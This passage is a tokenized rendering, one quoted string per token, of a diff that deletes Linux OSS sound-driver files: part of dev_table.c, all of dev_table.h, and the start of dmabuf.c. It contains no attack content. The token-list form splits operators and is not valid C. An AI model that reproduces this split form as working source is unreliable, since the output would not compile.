".", "*", "/", "#", "include", "<", "linux", "/", "init", ".", "h", ">", "#", "include", "\"", "sound_config", ".", "h", "\"", "struct", "audio_operations", "*", "audio_devs", "[", "MAX_AUDIO_DEV", "]", ";", "EXPORT_SYMBOL", "(", "audio_devs", ")", ";", "int", "num_audiodevs", ";", "EXPORT_SYMBOL", "(", "num_audiodevs", ")", ";", "struct", "mixer_operations", "*", "mixer_devs", "[", "MAX_MIXER_DEV", "]", ";", "EXPORT_SYMBOL", "(", "mixer_devs", ")", ";", "int", "num_mixers", ";", "EXPORT_SYMBOL", "(", "num_mixers", ")", ";", "struct", "synth_operations", "*", "synth_devs", "[", "MAX_SYNTH_DEV", "+", "MAX_MIDI_DEV", "]", ";", "EXPORT_SYMBOL", "(", "synth_devs", ")", ";", "int", "num_synths", ";", "struct", "midi_operations", "*", "midi_devs", "[", "MAX_MIDI_DEV", "]", ";", "EXPORT_SYMBOL", "(", "midi_devs", ")", ";", "int", "num_midis", ";", "EXPORT_SYMBOL", "(", "num_midis", ")", ";", "struct", "sound_timer_operations", "*", "sound_timer_devs", "[", "MAX_TIMER_DEV", "]", "=", "{", "&", "default_sound_timer", ",", "NULL", "}", ";", "EXPORT_SYMBOL", "(", "sound_timer_devs", ")", ";", "int", "num_sound_timers", "=", "1", ";", "static", "int", "sound_alloc_audiodev", "(", "void", ")", ";", "int", "sound_install_audiodrv", "(", "int", "vers", ",", "char", "*", "name", ",", "struct", "audio_driver", "*", "driver", ",", "int", "driver_size", ",", "int", "flags", ",", "unsigned", "int", "format_mask", ",", "void", "*", "devc", ",", "int", "dma1", ",", "int", "dma2", ")", "{", "struct", "audio_driver", "*", "d", ";", "struct", "audio_operations", "*", "op", ";", "int", "num", ";", "if", "(", "vers", "!", "=", "AUDIO_DRIVER_VERSION", "|", "|", "driver_size", ">", "sizeof", "(", "struct", "audio_driver", ")", ")", "{", "printk", "(", "KERN_ERR", "\"", "Sound", ":", "Incompatible", "audio", "driver", "for", "%", "s", "\\", "n", "\"", ",", "name", ")", ";", "return", "-", "EINVAL", ";", "}", "num", "=", "sound_alloc_audiodev", "(", ");", "if", "(", "num", "=", "=", "-", "1", ")", "{", "printk", "(", "KERN_ERR", "\"", "sound", ":", "Too", "many", "audio", "drivers", "\\", "n", "\"", ");", "return", "-", "EBUSY", ";", "}", "d", "=", "(", "struct", "audio_driver", "*", ")", "(", "sound_mem_blocks", "[", "sound_nblocks", "]", "=", "vmalloc", "(", "sizeof", "(", "struct", "audio_driver", ")", "))", ";", "sound_nblocks", "+", "+;", "if", "(", "sound_nblocks", ">", "=", "MAX_MEM_BLOCKS", ")", "sound_nblocks", "=", "MAX_MEM_BLOCKS", "-", "1", ";", "op", "=", "(", "struct", "audio_operations", "*", ")", "(", "sound_mem_blocks", "[", "sound_nblocks", "]", "=", "vzalloc", "(", "sizeof", "(", "struct", "audio_operations", ")", "))", ";", "sound_nblocks", "+", "+;", "if", "(", "sound_nblocks", ">", "=", "MAX_MEM_BLOCKS", ")", "sound_nblocks", "=", "MAX_MEM_BLOCKS", "-", "1", ";", "if", "(", "d", "=", "=", "NULL", "|", "|", "op", "=", "=", "NULL", ")", "{", "printk", "(", "KERN_ERR", "\"", "Sound", ":", "Can", "'", "t", "allocate", "driver", "for", "(", "%", "s", ")", "\\", "n", "\"", ",", "name", ")", ";", "sound_unload_audiodev", "(", "num", ")", ";", "return", "-", "ENOMEM", ";", "}", "init_waitqueue_head", "(", "&", "op", "-", ">", "in_sleeper", ")", ";", "init_waitqueue_head", "(", "&", "op", "-", ">", "out_sleeper", ")", ";", "init_waitqueue_head", "(", "&", "op", "-", ">", "poll_sleeper", ")", ";", "if", "(", "driver_size", "<", "sizeof", "(", "struct", "audio_driver", ")", ")", "memset", "(", "(", "char", "*", ")", "d", ",", "0", ",", "sizeof", "(", "struct", "audio_driver", ")", ");", "memcpy", "(", "(", "char", "*", ")", "d", ",", "(", "char", "*", ")", "driver", ",", "driver_size", ")", ";", "op", "-", ">", "d", "=", "d", ";", "strlcpy", "(", "op", "-", ">", "name", ",", "name", ",", "sizeof", "(", "op", "-", ">", "name", ")", ");", "op", "-", ">", "flags", "=", "flags", ";", "op", "-", ">", "format_mask", "=", "format_mask", ";", "op", "-", ">", "devc", "=", "devc", ";", "/", "*", "*", "Hardcoded", "defaults", "*", "/", "audio_devs", "[", "num", "]", "=", "op", ";", "DMAbuf_init", "(", "num", ",", "dma1", ",", "dma2", ")", ";", "audio_init_devices", "(", ");", "return", "num", ";", "}", "EXPORT_SYMBOL", "(", "sound_install_audiodrv", ")", ";", "int", "sound_install_mixer", "(", "int", "vers", ",", "char", "*", "name", ",", "struct", "mixer_operations", "*", "driver", ",", "int", "driver_size", ",", "void", "*", "devc", ")", "{", "struct", "mixer_operations", "*", "op", ";", "int", "n", "=", "sound_alloc_mixerdev", "(", ");", "if", "(", "n", "=", "=", "-", "1", ")", "{", "printk", "(", "KERN_ERR", "\"", "Sound", ":", "Too", "many", "mixer", "drivers", "\\", "n", "\"", ");", "return", "-", "EBUSY", ";", "}", "if", "(", "vers", "!", "=", "MIXER_DRIVER_VERSION", "|", "|", "driver_size", ">", "sizeof", "(", "struct", "mixer_operations", ")", ")", "{", "printk", "(", "KERN_ERR", "\"", "Sound", ":", "Incompatible", "mixer", "driver", "for", "%", "s", "\\", "n", "\"", ",", "name", ")", ";", "return", "-", "EINVAL", ";", "}", "/", "*", "FIXME", ":", "This", "leaks", "a", "mixer_operations", "struct", "every", "time", "its", "called", "until", "you", "unload", "sound", "!", "*", "/", "op", "=", "(", "struct", "mixer_operations", "*", ")", "(", "sound_mem_blocks", "[", "sound_nblocks", "]", "=", "vzalloc", "(", "sizeof", "(", "struct", "mixer_operations", ")", "))", ";", "sound_nblocks", "+", "+;", "if", "(", "sound_nblocks", ">", "=", "MAX_MEM_BLOCKS", ")", "sound_nblocks", "=", "MAX_MEM_BLOCKS", "-", "1", ";", "if", "(", "op", "=", "=", "NULL", ")", "{", "printk", "(", "KERN_ERR", "\"", "Sound", ":", "Can", "'", "t", "allocate", "mixer", "driver", "for", "(", "%", "s", ")", "\\", "n", "\"", ",", "name", ")", ";", "return", "-", "ENOMEM", ";", "}", "memcpy", "(", "(", "char", "*", ")", "op", ",", "(", "char", "*", ")", "driver", ",", "driver_size", ")", ";", "strlcpy", "(", "op", "-", ">", "name", ",", "name", ",", "sizeof", "(", "op", "-", ">", "name", ")", ");", "op", "-", ">", "devc", "=", "devc", ";", "mixer_devs", "[", "n", "]", "=", "op", ";", "return", "n", ";", "}", "EXPORT_SYMBOL", "(", "sound_install_mixer", ")", ";", "void", "sound_unload_audiodev", "(", "int", "dev", ")", "{", "if", "(", "dev", "!", "=", "-", "1", ")", "{", "DMAbuf_deinit", "(", "dev", ")", ";", "audio_devs", "[", "dev", "]", "=", "NULL", ";", "unregister_sound_dsp", "(", "(", "dev", "<", "<", "4", ")", "+", "3", ")", ";", "}", "}", "EXPORT_SYMBOL", "(", "sound_unload_audiodev", ")", ";", "static", "int", "sound_alloc_audiodev", "(", "void", ")", "{", "int", "i", "=", "register_sound_dsp", "(", "&", "oss_sound_fops", ",", "-", "1", ")", ";", "if", "(", "i", "=", "=-", "1", ")", "return", "i", ";", "i", ">", ">=", "4", ";", "if", "(", "i", ">", "=", "num_audiodevs", ")", "num_audiodevs", "=", "i", "+", "1", ";", "return", "i", ";", "}", "int", "sound_alloc_mididev", "(", "void", ")", "{", "int", "i", "=", "register_sound_midi", "(", "&", "oss_sound_fops", ",", "-", "1", ")", ";", "if", "(", "i", "=", "=-", "1", ")", "return", "i", ";", "i", ">", ">=", "4", ";", "if", "(", "i", ">", "=", "num_midis", ")", "num_midis", "=", "i", "+", "1", ";", "return", "i", ";", "}", "EXPORT_SYMBOL", "(", "sound_alloc_mididev", ")", ";", "int", "sound_alloc_synthdev", "(", "void", ")", "{", "int", "i", ";", "for", "(", "i", "=", "0", ";", "i", "<", "MAX_SYNTH_DEV", ";", "i", "+", "+)", "{", "if", "(", "synth_devs", "[", "i", "]", "=", "=", "NULL", ")", "{", "if", "(", "i", ">", "=", "num_synths", ")", "num_synths", "+", "+;", "return", "i", ";", "}", "}", "return", "-", "1", ";", "}", "EXPORT_SYMBOL", "(", "sound_alloc_synthdev", ")", ";", "int", "sound_alloc_mixerdev", "(", "void", ")", "{", "int", "i", "=", "register_sound_mixer", "(", "&", "oss_sound_fops", ",", "-", "1", ")", ";", "if", "(", "i", "=", "=-", "1", ")", "return", "-", "1", ";", "i", ">", ">=", "4", ";", "if", "(", "i", ">", "=", "num_mixers", ")", "num_mixers", "=", "i", "+", "1", ";", "return", "i", ";", "}", "EXPORT_SYMBOL", "(", "sound_alloc_mixerdev", ")", ";", "int", "sound_alloc_timerdev", "(", "void", ")", "{", "int", "i", ";", "for", "(", "i", "=", "0", ";", "i", "<", "MAX_TIMER_DEV", ";", "i", "+", "+)", "{", "if", "(", "sound_timer_devs", "[", "i", "]", "=", "=", "NULL", ")", "{", "if", "(", "i", ">", "=", "num_sound_timers", ")", "num_sound_timers", "+", "+;", "return", "i", ";", "}", "}", "return", "-", "1", ";", "}", "EXPORT_SYMBOL", "(", "sound_alloc_timerdev", ")", ";", "void", "sound_unload_mixerdev", "(", "int", "dev", ")", "{", "if", "(", "dev", "!", "=", "-", "1", ")", "{", "mixer_devs", "[", "dev", "]", "=", "NULL", ";", "unregister_sound_mixer", "(", "dev", "<", "<", "4", ")", ";", "num_mixers", "-", "-;", "}", "}", "EXPORT_SYMBOL", "(", "sound_unload_mixerdev", ")", ";", "void", "sound_unload_mididev", "(", "int", "dev", ")", "{", "if", "(", "dev", "!", "=", "-", "1", ")", "{", "midi_devs", "[", "dev", "]", "=", "NULL", ";", "unregister_sound_midi", "(", "(", "dev", "<", "<", "4", ")", "+", "2", ")", ";", "}", "}", "EXPORT_SYMBOL", "(", "sound_unload_mididev", ")", ";", "void", "sound_unload_synthdev", "(", "int", "dev", ")", "{", "if", "(", "dev", "!", "=", "-", "1", ")", "synth_devs", "[", "dev", "]", "=", "NULL", ";", "}", "EXPORT_SYMBOL", "(", "sound_unload_synthdev", ")", ";", "void", "sound_unload_timerdev", "(", "int", "dev", ")", "{", "if", "(", "dev", "!", "=", "-", "1", ")", "sound_timer_devs", "[", "dev", "]", "=", "NULL", ";", "}", "EXPORT_SYMBOL", "(", "sound_unload_timerdev", ")", ";", "@", "@", "-", "1", ",", "390", "+", "0", ",", "0", "@", "@", "/", "*", "*", "dev_table", ".", "h", "*", "*", "Global", "definitions", "for", "device", "call", "tables", "*", "*", "*", "Copyright", "(", "C", ")", "by", "Hannu", "Savolainen", "1993", "-", "1997", "*", "*", "OSS", "/", "Free", "for", "Linux", "is", "distributed", "under", "the", "GNU", "GENERAL", "PUBLIC", "LICENSE", "(", "GPL", ")", "*", "Version", "2", "(", "June", "1991", ")", ".", "See", "the", "\"", "COPYING", "\"", "file", "distributed", "with", "this", "software", "*", "for", "more", "info", ".", "*", "/", "#", "ifndef", "_DEV_TABLE_H_", "#", "define", "_DEV_TABLE_H_", "#", "include", "<", "linux", "/", "spinlock", ".", "h", ">", "/", "*", "*", "Sound", "card", "numbers", "27", "to", "999", ".", "(", "1", "to", "26", "are", "defined", "in", "soundcard", ".", "h", ")", "*", "Numbers", "1000", "to", "N", "are", "reserved", "for", "driver", "'", "s", "internal", "use", ".", "*", "/", "#", "define", "SNDCARD_DESKPROXL", "27", "/", "*", "Compaq", "Deskpro", "XL", "*", "/", "#", "define", "SNDCARD_VIDC", "28", "/", "*", "ARMs", "VIDC", "*", "/", "#", "define", "SNDCARD_SBPNP", "29", "#", "define", "SNDCARD_SOFTOSS", "36", "#", "define", "SNDCARD_VMIDI", "37", "#", "define", "SNDCARD_OPL3SA1", "38", "/", "*", "Note", ":", "clash", "in", "msnd", ".", "h", "*", "/", "#", "define", "SNDCARD_OPL3SA1_SB", "39", "#", "define", "SNDCARD_OPL3SA1_MPU", "40", "#", "define", "SNDCARD_WAVEFRONT", "41", "#", "define", "SNDCARD_OPL3SA2", "42", "#", "define", "SNDCARD_OPL3SA2_MPU", "43", "#", "define", "SNDCARD_WAVEARTIST", "44", "/", "*", "Waveartist", "*", "/", "#", "define", "SNDCARD_OPL3SA2_MSS", "45", "/", "*", "Originally", "missed", "*", "/", "#", "define", "SNDCARD_AD1816", "88", "/", "*", "*", "NOTE", "!", "NOTE", "!", "NOTE", "!", "NOTE", "!", "*", "*", "If", "you", "modify", "this", "file", ",", "please", "check", "the", "dev_table", ".", "c", "also", ".", "*", "*", "NOTE", "!", "NOTE", "!", "NOTE", "!", "NOTE", "!", "*", "/", "struct", "driver_info", "{", "char", "*", "driver_id", ";", "int", "card_subtype", ";", "/", "*", "Driver", "specific", ".", "Usually", "0", "*", "/", "int", "card_type", ";", "/", "*", "From", "soundcard", ".", "h", "*", "/", "char", "*", "name", ";", "void", "(", "*", "attach", ")", "(", "struct", "address_info", "*", "hw_config", ")", ";", "int", "(", "*", "probe", ")", "(", "struct", "address_info", "*", "hw_config", ")", ";", "void", "(", "*", "unload", ")", "(", "struct", "address_info", "*", "hw_config", ")", ";", "}", ";", "struct", "card_info", "{", "int", "card_type", ";", "/", "*", "Link", "(", "search", "key", ")", "to", "the", "driver", "list", "*", "/", "struct", "address_info", "config", ";", "int", "enabled", ";", "void", "*", "for_driver_use", ";", "}", ";", "/", "*", "*", "Device", "specific", "parameters", "(", "used", "only", "by", "dmabuf", ".", "c", ")", "*", "/", "#", "define", "MAX_SUB_BUFFERS", "(", "32", "*", "MAX_REALTIME_FACTOR", ")", "#", "define", "DMODE_NONE", "0", "#", "define", "DMODE_OUTPUT", "PCM_ENABLE_OUTPUT", "#", "define", "DMODE_INPUT", "PCM_ENABLE_INPUT", "struct", "dma_buffparms", "{", "int", "dma_mode", ";", "/", "*", "DMODE_INPUT", ",", "DMODE_OUTPUT", "or", "DMODE_NONE", "*", "/", "int", "closing", ";", "/", "*", "*", "Pointers", "to", "raw", "buffers", "*", "/", "char", "*", "raw_buf", ";", "unsigned", "long", "raw_buf_phys", ";", "int", "buffsize", ";", "/", "*", "*", "Device", "state", "tables", "*", "/", "unsigned", "long", "flags", ";", "#", "define", "DMA_BUSY", "0x00000001", "#", "define", "DMA_RESTART", "0x00000002", "#", "define", "DMA_ACTIVE", "0x00000004", "#", "define", "DMA_STARTED", "0x00000008", "#", "define", "DMA_EMPTY", "0x00000010", "#", "define", "DMA_ALLOC_DONE", "0x00000020", "#", "define", "DMA_SYNCING", "0x00000040", "#", "define", "DMA_DIRTY", "0x00000080", "#", "define", "DMA_POST", "0x00000100", "#", "define", "DMA_NODMA", "0x00000200", "#", "define", "DMA_NOTIMEOUT", "0x00000400", "int", "open_mode", ";", "/", "*", "*", "Queue", "parameters", ".", "*", "/", "int", "qlen", ";", "int", "qhead", ";", "int", "qtail", ";", "spinlock_t", "lock", ";", "int", "cfrag", ";", "/", "*", "Current", "incomplete", "fragment", "(", "write", ")", "*", "/", "int", "nbufs", ";", "int", "counts", "[", "MAX_SUB_BUFFERS", "]", ";", "int", "subdivision", ";", "int", "fragment_size", ";", "int", "needs_reorg", ";", "int", "max_fragments", ";", "int", "bytes_in_use", ";", "int", "underrun_count", ";", "unsigned", "long", "byte_counter", ";", "unsigned", "long", "user_counter", ";", "unsigned", "long", "max_byte_counter", ";", "int", "data_rate", ";", "/", "*", "Bytes", "/", "second", "*", "/", "int", "mapping_flags", ";", "#", "define", "DMA_MAP_MAPPED", "0x00000001", "char", "neutral_byte", ";", "int", "dma", ";", "/", "*", "DMA", "channel", "*", "/", "int", "applic_profile", ";", "/", "*", "Application", "profile", "(", "APF_", "*", ")", "*", "/", "/", "*", "Interrupt", "callback", "stuff", "*", "/", "void", "(", "*", "audio_callback", ")", "(", "int", "dev", ",", "int", "parm", ")", ";", "int", "callback_parm", ";", "int", "buf_flags", "[", "MAX_SUB_BUFFERS", "]", ";", "#", "define", "BUFF_EOF", "0x00000001", "/", "*", "Increment", "eof", "count", "*", "/", "#", "define", "BUFF_DIRTY", "0x00000002", "/", "*", "Buffer", "written", "*", "/", "}", ";", "/", "*", "*", "Structure", "for", "use", "with", "various", "microcontrollers", "and", "DSP", "processors", "*", "in", "the", "recent", "sound", "cards", ".", "*", "/", "typedef", "struct", "coproc_operations", "{", "char", "name", "[", "64", "]", ";", "struct", "module", "*", "owner", ";", "int", "(", "*", "open", ")", "(", "void", "*", "devc", ",", "int", "sub_device", ")", ";", "void", "(", "*", "close", ")", "(", "void", "*", "devc", ",", "int", "sub_device", ")", ";", "int", "(", "*", "ioctl", ")", "(", "void", "*", "devc", ",", "unsigned", "int", "cmd", ",", "void", "__user", "*", "arg", ",", "int", "local", ")", ";", "void", "(", "*", "reset", ")", "(", "void", "*", "devc", ")", ";", "void", "*", "devc", ";", "/", "*", "Driver", "specific", "info", "*", "/", "}", "coproc_operations", ";", "struct", "audio_driver", "{", "struct", "module", "*", "owner", ";", "int", "(", "*", "open", ")", "(", "int", "dev", ",", "int", "mode", ")", ";", "void", "(", "*", "close", ")", "(", "int", "dev", ")", ";", "void", "(", "*", "output_block", ")", "(", "int", "dev", ",", "unsigned", "long", "buf", ",", "int", "count", ",", "int", "intrflag", ")", ";", "void", "(", "*", "start_input", ")", "(", "int", "dev", ",", "unsigned", "long", "buf", ",", "int", "count", ",", "int", "intrflag", ")", ";", "int", "(", "*", "ioctl", ")", "(", "int", "dev", ",", "unsigned", "int", "cmd", ",", "void", "__user", "*", "arg", ")", ";", "int", "(", "*", "prepare_for_input", ")", "(", "int", "dev", ",", "int", "bufsize", ",", "int", "nbufs", ")", ";", "int", "(", "*", "prepare_for_output", ")", "(", "int", "dev", ",", "int", "bufsize", ",", "int", "nbufs", ")", ";", "void", "(", "*", "halt_io", ")", "(", "int", "dev", ")", ";", "int", "(", "*", "local_qlen", ")", "(", "int", "dev", ")", ";", "void", "(", "*", "copy_user", ")", "(", "int", "dev", ",", "char", "*", "localbuf", ",", "int", "localoffs", ",", "const", "char", "__user", "*", "userbuf", ",", "int", "useroffs", ",", "int", "max_in", ",", "int", "max_out", ",", "int", "*", "used", ",", "int", "*", "returned", ",", "int", "len", ")", ";", "void", "(", "*", "halt_input", ")", "(", "int", "dev", ")", ";", "void", "(", "*", "halt_output", ")", "(", "int", "dev", ")", ";", "void", "(", "*", "trigger", ")", "(", "int", "dev", ",", "int", "bits", ")", ";", "int", "(", "*", "set_speed", ")", "(", "int", "dev", ",", "int", "speed", ")", ";", "unsigned", "int", "(", "*", "set_bits", ")", "(", "int", "dev", ",", "unsigned", "int", "bits", ")", ";", "short", "(", "*", "set_channels", ")", "(", "int", "dev", ",", "short", "channels", ")", ";", "void", "(", "*", "postprocess_write", ")", "(", "int", "dev", ")", ";", "/", "*", "Device", "spesific", "postprocessing", "for", "written", "data", "*", "/", "void", "(", "*", "preprocess_read", ")", "(", "int", "dev", ")", ";", "/", "*", "Device", "spesific", "preprocessing", "for", "read", "data", "*", "/", "void", "(", "*", "mmap", ")", "(", "int", "dev", ")", ";", "}", ";", "struct", "audio_operations", "{", "char", "name", "[", "128", "]", ";", "int", "flags", ";", "#", "define", "NOTHING_SPECIAL", "0x00", "#", "define", "NEEDS_RESTART", "0x01", "#", "define", "DMA_AUTOMODE", "0x02", "#", "define", "DMA_DUPLEX", "0x04", "#", "define", "DMA_PSEUDO_AUTOMODE", "0x08", "#", "define", "DMA_HARDSTOP", "0x10", "#", "define", "DMA_EXACT", "0x40", "#", "define", "DMA_NORESET", "0x80", "int", "format_mask", ";", "/", "*", "Bitmask", "for", "supported", "audio", "formats", "*", "/", "void", "*", "devc", ";", "/", "*", "Driver", "specific", "info", "*", "/", "struct", "audio_driver", "*", "d", ";", "void", "*", "portc", ";", "/", "*", "Driver", "specific", "info", "*", "/", "struct", "dma_buffparms", "*", "dmap_in", ",", "*", "dmap_out", ";", "struct", "coproc_operations", "*", "coproc", ";", "int", "mixer_dev", ";", "int", "enable_bits", ";", "int", "open_mode", ";", "int", "go", ";", "int", "min_fragment", ";", "/", "*", "0", "=", "=", "unlimited", "*", "/", "int", "max_fragment", ";", "/", "*", "0", "=", "=", "unlimited", "*", "/", "int", "parent_dev", ";", "/", "*", "0", "-", ">", "no", "parent", ",", "1", "to", "n", "-", ">", "parent", "=", "parent_dev", "+", "1", "*", "/", "/", "*", "fields", "formerly", "in", "dmabuf", ".", "c", "*", "/", "wait_queue_head_t", "in_sleeper", ";", "wait_queue_head_t", "out_sleeper", ";", "wait_queue_head_t", "poll_sleeper", ";", "/", "*", "fields", "formerly", "in", "audio", ".", "c", "*", "/", "int", "audio_mode", ";", "#", "define", "AM_NONE", "0", "#", "define", "AM_WRITE", "OPEN_WRITE", "#", "define", "AM_READ", "OPEN_READ", "int", "local_format", ";", "int", "audio_format", ";", "int", "local_conversion", ";", "#", "define", "CNV_MU_LAW", "0x00000001", "/", "*", "large", "structures", "at", "the", "end", "to", "keep", "offsets", "small", "*", "/", "struct", "dma_buffparms", "dmaps", "[", "2", "]", ";", "}", ";", "int", "*", "load_mixer_volumes", "(", "char", "*", "name", ",", "int", "*", "levels", ",", "int", "present", ")", ";", "struct", "mixer_operations", "{", "struct", "module", "*", "owner", ";", "char", "id", "[", "16", "]", ";", "char", "name", "[", "64", "]", ";", "int", "(", "*", "ioctl", ")", "(", "int", "dev", ",", "unsigned", "int", "cmd", ",", "void", "__user", "*", "arg", ")", ";", "void", "*", "devc", ";", "int", "modify_counter", ";", "}", ";", "struct", "synth_operations", "{", "struct", "module", "*", "owner", ";", "char", "*", "id", ";", "/", "*", "Unique", "identifier", "(", "ASCII", ")", "max", "29", "char", "*", "/", "struct", "synth_info", "*", "info", ";", "int", "midi_dev", ";", "int", "synth_type", ";", "int", "synth_subtype", ";", "int", "(", "*", "open", ")", "(", "int", "dev", ",", "int", "mode", ")", ";", "void", "(", "*", "close", ")", "(", "int", "dev", ")", ";", "int", "(", "*", "ioctl", ")", "(", "int", "dev", ",", "unsigned", "int", "cmd", ",", "void", "__user", "*", "arg", ")", ";", "int", "(", "*", "kill_note", ")", "(", "int", "dev", ",", "int", "voice", ",", "int", "note", ",", "int", "velocity", ")", ";", "int", "(", "*", "start_note", ")", "(", "int", "dev", ",", "int", "voice", ",", "int", "note", ",", "int", "velocity", ")", ";", "int", "(", "*", "set_instr", ")", "(", "int", "dev", ",", "int", "voice", ",", "int", "instr", ")", ";", "void", "(", "*", "reset", ")", "(", "int", "dev", ")", ";", "void", "(", "*", "hw_control", ")", "(", "int", "dev", ",", "unsigned", "char", "*", "event", ")", ";", "int", "(", "*", "load_patch", ")", "(", "int", "dev", ",", "int", "format", ",", "const", "char", "__user", "*", "addr", ",", "int", "count", ",", "int", "pmgr_flag", ")", ";", "void", "(", "*", "aftertouch", ")", "(", "int", "dev", ",", "int", "voice", ",", "int", "pressure", ")", ";", "void", "(", "*", "controller", ")", "(", "int", "dev", ",", "int", "voice", ",", "int", "ctrl_num", ",", "int", "value", ")", ";", "void", "(", "*", "panning", ")", "(", "int", "dev", ",", "int", "voice", ",", "int", "value", ")", ";", "void", "(", "*", "volume_method", ")", "(", "int", "dev", ",", "int", "mode", ")", ";", "void", "(", "*", "bender", ")", "(", "int", "dev", ",", "int", "chn", ",", "int", "value", ")", ";", "int", "(", "*", "alloc_voice", ")", "(", "int", "dev", ",", "int", "chn", ",", "int", "note", ",", "struct", "voice_alloc_info", "*", "alloc", ")", ";", "void", "(", "*", "setup_voice", ")", "(", "int", "dev", ",", "int", "voice", ",", "int", "chn", ")", ";", "int", "(", "*", "send_sysex", ")", "(", "int", "dev", ",", "unsigned", "char", "*", "bytes", ",", "int", "len", ")", ";", "struct", "voice_alloc_info", "alloc", ";", "struct", "channel_info", "chn_info", "[", "16", "]", ";", "int", "emulation", ";", "#", "define", "EMU_GM", "1", "/", "*", "General", "MIDI", "*", "/", "#", "define", "EMU_XG", "2", "/", "*", "Yamaha", "XG", "*", "/", "#", "define", "MAX_SYSEX_BUF", "64", "unsigned", "char", "sysex_buf", "[", "MAX_SYSEX_BUF", "]", ";", "int", "sysex_ptr", ";", "}", ";", "struct", "midi_input_info", "{", "/", "*", "MIDI", "input", "scanner", "variables", "*", "/", "#", "define", "MI_MAX", "10", "volatile", "int", "m_busy", ";", "unsigned", "char", "m_buf", "[", "MI_MAX", "]", ";", "unsigned", "char", "m_prev_status", ";", "/", "*", "For", "running", "status", "*", "/", "int", "m_ptr", ";", "#", "define", "MST_INIT", "0", "#", "define", "MST_DATA", "1", "#", "define", "MST_SYSEX", "2", "int", "m_state", ";", "int", "m_left", ";", "}", ";", "struct", "midi_operations", "{", "struct", "module", "*", "owner", ";", "struct", "midi_info", "info", ";", "struct", "synth_operations", "*", "converter", ";", "struct", "midi_input_info", "in_info", ";", "int", "(", "*", "open", ")", "(", "int", "dev", ",", "int", "mode", ",", "void", "(", "*", "inputintr", ")", "(", "int", "dev", ",", "unsigned", "char", "data", ")", ",", "void", "(", "*", "outputintr", ")", "(", "int", "dev", ")", ")", ";", "void", "(", "*", "close", ")", "(", "int", "dev", ")", ";", "int", "(", "*", "ioctl", ")", "(", "int", "dev", ",", "unsigned", "int", "cmd", ",", "void", "__user", "*", "arg", ")", ";", "int", "(", "*", "outputc", ")", "(", "int", "dev", ",", "unsigned", "char", "data", ")", ";", "int", "(", "*", "start_read", ")", "(", "int", "dev", ")", ";", "int", "(", "*", "end_read", ")", "(", "int", "dev", ")", ";", "void", "(", "*", "kick", ")", "(", "int", "dev", ")", ";", "int", "(", "*", "command", ")", "(", "int", "dev", ",", "unsigned", "char", "*", "data", ")", ";", "int", "(", "*", "buffer_status", ")", "(", "int", "dev", ")", ";", "int", "(", "*", "prefix_cmd", ")", "(", "int", "dev", ",", "unsigned", "char", "status", ")", ";", "struct", "coproc_operations", "*", "coproc", ";", "void", "*", "devc", ";", "}", ";", "struct", "sound_lowlev_timer", "{", "int", "dev", ";", "int", "priority", ";", "unsigned", "int", "(", "*", "tmr_start", ")", "(", "int", "dev", ",", "unsigned", "int", "usecs", ")", ";", "void", "(", "*", "tmr_disable", ")", "(", "int", "dev", ")", ";", "void", "(", "*", "tmr_restart", ")", "(", "int", "dev", ")", ";", "}", ";", "struct", "sound_timer_operations", "{", "struct", "module", "*", "owner", ";", "struct", "sound_timer_info", "info", ";", "int", "priority", ";", "int", "devlink", ";", "int", "(", "*", "open", ")", "(", "int", "dev", ",", "int", "mode", ")", ";", "void", "(", "*", "close", ")", "(", "int", "dev", ")", ";", "int", "(", "*", "event", ")", "(", "int", "dev", ",", "unsigned", "char", "*", "ev", ")", ";", "unsigned", "long", "(", "*", "get_time", ")", "(", "int", "dev", ")", ";", "int", "(", "*", "ioctl", ")", "(", "int", "dev", ",", "unsigned", "int", "cmd", ",", "void", "__user", "*", "arg", ")", ";", "void", "(", "*", "arm_timer", ")", "(", "int", "dev", ",", "long", "time", ")", ";", "}", ";", "extern", "struct", "sound_timer_operations", "default_sound_timer", ";", "extern", "struct", "audio_operations", "*", "audio_devs", "[", "MAX_AUDIO_DEV", "]", ";", "extern", "int", "num_audiodevs", ";", "extern", "struct", "mixer_operations", "*", "mixer_devs", "[", "MAX_MIXER_DEV", "]", ";", "extern", "int", "num_mixers", ";", "extern", "struct", "synth_operations", "*", "synth_devs", "[", "MAX_SYNTH_DEV", "+", "MAX_MIDI_DEV", "]", ";", "extern", "int", "num_synths", ";", "extern", "struct", "midi_operations", "*", "midi_devs", "[", "MAX_MIDI_DEV", "]", ";", "extern", "int", "num_midis", ";", "extern", "struct", "sound_timer_operations", "*", "sound_timer_devs", "[", "MAX_TIMER_DEV", "]", ";", "extern", "int", "num_sound_timers", ";", "extern", "int", "sound_map_buffer", "(", "int", "dev", ",", "struct", "dma_buffparms", "*", "dmap", ",", "buffmem_desc", "*", "info", ")", ";", "void", "sound_timer_init", "(", "struct", "sound_lowlev_timer", "*", "t", ",", "char", "*", "name", ")", ";", "void", "sound_dma_intr", "(", "int", "dev", ",", "struct", "dma_buffparms", "*", "dmap", ",", "int", "chan", ")", ";", "#", "define", "AUDIO_DRIVER_VERSION", "2", "#", "define", "MIXER_DRIVER_VERSION", "2", "int", "sound_install_audiodrv", "(", "int", "vers", ",", "char", "*", "name", ",", "struct", "audio_driver", "*", "driver", ",", "int", "driver_size", ",", "int", "flags", ",", "unsigned", "int", "format_mask", ",", "void", "*", "devc", ",", "int", "dma1", ",", "int", "dma2", ")", ";", "int", "sound_install_mixer", "(", "int", "vers", ",", "char", "*", "name", ",", "struct", "mixer_operations", "*", "driver", ",", "int", "driver_size", ",", "void", "*", "devc", ")", ";", "void", "sound_unload_audiodev", "(", "int", "dev", ")", ";", "void", "sound_unload_mixerdev", "(", "int", "dev", ")", ";", "void", "sound_unload_mididev", "(", "int", "dev", ")", ";", "void", "sound_unload_synthdev", "(", "int", "dev", ")", ";", "void", "sound_unload_timerdev", "(", "int", "dev", ")", ";", "int", "sound_alloc_mixerdev", "(", "void", ")", ";", "int", "sound_alloc_timerdev", "(", "void", ")", ";", "int", "sound_alloc_synthdev", "(", "void", ")", ";", "int", "sound_alloc_mididev", "(", "void", ")", ";", "#", "endif", "/", "*", "_DEV_TABLE_H_", "*", "/", "@", "@", "-", "1", ",", "1268", "+", "0", ",", "0", "@", "@", "/", "*", "*", "sound", "/", "oss", "/", "dmabuf", ".", "c", "*", "*", "The", "DMA", "buffer", "manager", "for", "digitized", "voice", "applications", "*", "/", "/", "*", "*", "Copyright", "(", "C", ")", "by", "Hannu", "Savolainen", "1993", "-", "1997", "*", "*", "OSS", "/", "Free", "for", "Linux", "is", "distributed", "under", "the", "GNU", "GENERAL", "PUBLIC", "LICENSE", "(", "GPL", ")", "*", "Version", "2", "(", "June", "1991", 